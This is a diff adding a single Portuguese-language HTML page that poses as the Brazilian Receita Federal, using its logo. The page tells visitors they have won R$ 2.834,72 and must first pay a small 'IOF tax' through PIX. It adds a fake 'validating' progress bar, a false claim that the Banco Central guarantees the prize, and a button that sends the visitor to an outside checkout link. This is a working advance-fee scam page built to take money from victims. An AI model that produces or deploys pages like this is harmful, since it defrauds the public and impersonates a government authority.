@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+     <script
+            src="https://cdn.xtracky.com/scripts/utm-handler.js"
+            data-token="0fcfda61-58e6-4822-9e5a-0184c5956ecc"
+      data-click-id-param="click_id">
+    >
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receita Federal - IOF</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+
+        .loading-screen.hidden {
+            display: none;
+        }
+
+        .loading-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 40px;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            max-width: 400px;
+            height: 6px;
+            background-color: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff4d6d, #ff758f);
+            width: 0%;
+            border-radius: 3px;
+            transition: width 0.1s ease;
+        }
+
+        /* Main Content */
+        .main-content {
+            display: none;
+        }
+
+        .main-content.visible {
+            display: block;
+        }
+
+        /* Header */
+       
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .header-icon {
+            width: 28px;
+            height: 28px;
+        }
+
+        .header-icon svg {
+            fill: #fff;
+        }
+
+        .header-title {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        /* Alert Banner */
+        .alert-banner {
+            background-color: #fef3c7;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .alert-icon {
+            color: #d97706;
+            font-size: 18px;
+        }
+
+        .alert-text {
+            color: #92400e;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Container */
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Section Title */
+        .section-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a365d;
+            margin-bottom: 12px;
+        }
+
+        .section-description {
+            font-size: 14px;
+            color: #4a5568;
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+
+        .required-notice {
+            color: #dc2626;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+
+        .required-notice::before {
+            content: "* ";
+        }
+
+        /* Summary Card */
+        .summary-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .summary-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a202c;
+            margin-bottom: 20px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding: 16px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+        }
+
+        .summary-label {
+            font-size: 14px;
+            color: #4a5568;
+        }
+
+        .summary-label-sub {
+            font-size: 12px;
+            color: #718096;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .summary-value {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a202c;
+            text-align: right;
+        }
+
+        .summary-value.negative {
+            color: #dc2626;
+        }
+
+        .summary-value.negative::before {
+            content: "- ";
+        }
+
+        .total-row {
+            padding-top: 20px;
+            margin-top: 4px;
+        }
+
+        .total-row .summary-label {
+            font-weight: 600;
+            color: #1a202c;
+        }
+
+        /* Payment Notice */
+        .payment-notice {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            padding: 12px 0;
+            font-size: 13px;
+            color: #718096;
+        }
+
+        .payment-notice-icon {
+            color: #a0aec0;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        /* Guarantee Card */
+        .guarantee-card {
+            background: #f0fdf4;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .guarantee-icon {
+            width: 40px;
+            height: 40px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .guarantee-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+        }
+
+        .guarantee-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a202c;
+            margin-bottom: 4px;
+        }
+
+        .guarantee-text {
+            font-size: 14px;
+            color: #4a5568;
+        }
+
+        /* Payment Method Card */
+        .payment-method-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .payment-method-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a202c;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .pix-logo {
+            width: 80px;
+            height: auto;
+            margin-bottom: 12px;
+        }
+
+        .pix-notice {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            font-size: 13px;
+            color: #4a5568;
+        }
+
+        .pix-notice-icon {
+            color: #a0aec0;
+            flex-shrink: 0;
+        }
+
+        /* Terms Checkbox */
+        .terms-container {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .terms-label {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            cursor: pointer;
+            font-size: 13px;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+
+        .terms-checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #cbd5e0;
+            border-radius: 4px;
+            flex-shrink: 0;
+            margin-top: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .terms-checkbox.checked {
+            background: #1a365d;
+            border-color: #1a365d;
+        }
+
+        .terms-checkbox svg {
+            width: 14px;
+            height: 14px;
+            fill: #fff;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .terms-checkbox.checked svg {
+            opacity: 1;
+        }
+
+        .terms-input {
+            display: none;
+        }
+
+        /* Submit Button */
+        .submit-button {
+            width: 100%;
+            padding: 16px 24px;
+            background: #64748b;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: all 0.3s;
+        }
+
+        .submit-button.active {
+            background: #1a365d;
+            cursor: pointer;
+        }
+
+        .submit-button.active:hover {
+            background: #2c5282;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <h1 class="loading-text">Validando pesquisa</h1>
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <!-- Header -->
+        <header class="header">
+        <div style="display:flex; justify-content:center; align-items:center; background-color:#00205B; height:105px;">
+  <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal" style="max-width:100%; max-height:100%; object-fit:contain;">
+</div>
+        </header>
+
+        <!-- Alert Banner -->
+        <div class="alert-banner">
+            <span class="alert-icon">⚠</span>
+            <span class="alert-text">Imposto (IOF) obrigatório</span>
+        </div>
+
+        <!-- Container -->
+        <div class="container">
+            <!-- Section Title -->
+            <h1 class="section-title">Imposto sobre Operações Financeiras (IOF)</h1>
+            <p class="section-description">
+                O pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório e exigido pelo Banco Central do Brasil (Lei nº 8.894/94)
+            </p>
+            <p class="required-notice">
+                É necessário realizar o pagamento do IOF para receber o valor acumulado.
+            </p>
+
+            <!-- Summary Card -->
+            <div class="summary-card">
+                <h2 class="summary-title">Resumo</h2>
+                
+                <div class="summary-row">
+                    <span class="summary-label">Valor ganho</span>
+                    <span class="summary-value">R$ 2.834,72</span>
+                </div>
+                
+                <div class="summary-row">
+                    <div>
+                        <span class="summary-label">Valor a ser pago (IOF)</span>
+                        <span class="summary-label-sub">Imposto sobre Operações Financeiras</span>
+                    </div>
+                    <span class="summary-value negative">R$20,64</span>
+                </div>
+                
+                <div class="summary-row total-row">
+                    <span class="summary-label">Total a receber</span>
+                    <span class="summary-value">R$ 2.834,72</span>
+                </div>
+
+                <div class="payment-notice">
+                    <span class="payment-notice-icon">ℹ</span>
+                    <span>O pagamento de R$ 2.834,72 será processado via PIX de forma imediata.</span>
+                </div>
+            </div>
+
+            <!-- Guarantee Card -->
+            <div class="guarantee-card">
+                <div class="guarantee-icon">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                    </svg>
+                </div>
+                <h3 class="guarantee-title">Garantia de recebimento</h3>
+                <p class="guarantee-text">O valor ganho de R$ 2.834,72 é garantido pelo Banco Central do Brasil</p>
+            </div>
+
+            <!-- Payment Method Card -->
+            <div class="payment-method-card">
+                <h3 class="payment-method-title">Método de pagamento</h3>
+                <img src="https://baixarfavicon.com.br/wp-content/themes/baixarfavicon/ferramentas/logos-pix-png/logos/logo-pix-1024x1024.png" alt="PIX" class="pix-logo">
+                <div class="pix-notice">
+                    <span class="pix-notice-icon">ℹ</span>
+                    <span>Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.</span>
+                </div>
+            </div>
+
+            <!-- Terms Container -->
+            <div class="terms-container">
+                <label class="terms-label" onclick="toggleCheckbox()">
+                    <div class="terms-checkbox" id="checkbox">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                        </svg>
+                    </div>
+                    <span>Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras (IOF), necessário para completar o saque em conformidade com as regulamentações vigentes.</span>
+                </label>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="container-submit">
+  <button class="submit-button" id="submitButton" onclick="handleSubmit()">Pagar Imposto</button>
+</div>
+        </div>
+    </div>
+
+    <script>
+        let isChecked = false;
+
+        // Loading animation
+        window.onload = function() {
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const loadingScreen = document.getElementById('loadingScreen');
+            const mainContent = document.getElementById('mainContent');
+
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+                progressBar.style.width = progress + '%';
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        loadingScreen.classList.add('hidden');
+                        mainContent.classList.add('visible');
+                    }, 500);
+                }
+            }, 200);
+        };
+
+        function toggleCheckbox() {
+            isChecked = !isChecked;
+            const checkbox = document.getElementById('checkbox');
+            const submitButton = document.getElementById('submitButton');
+
+            if (isChecked) {
+                checkbox.classList.add('checked');
+                submitButton.classList.add('active');
+            } else {
+                checkbox.classList.remove('checked');
+                submitButton.classList.remove('active');
+            }
+        }
+
+        function handleSubmit() {
+            if (isChecked) {
+                window.location.href = 'https://www.pagamentos-seguro.link/checkout/92fffcf1-5592-43fd-b132-7e6a695967cb';
+            }
+        }
+    </script>
+</body>
+</html>
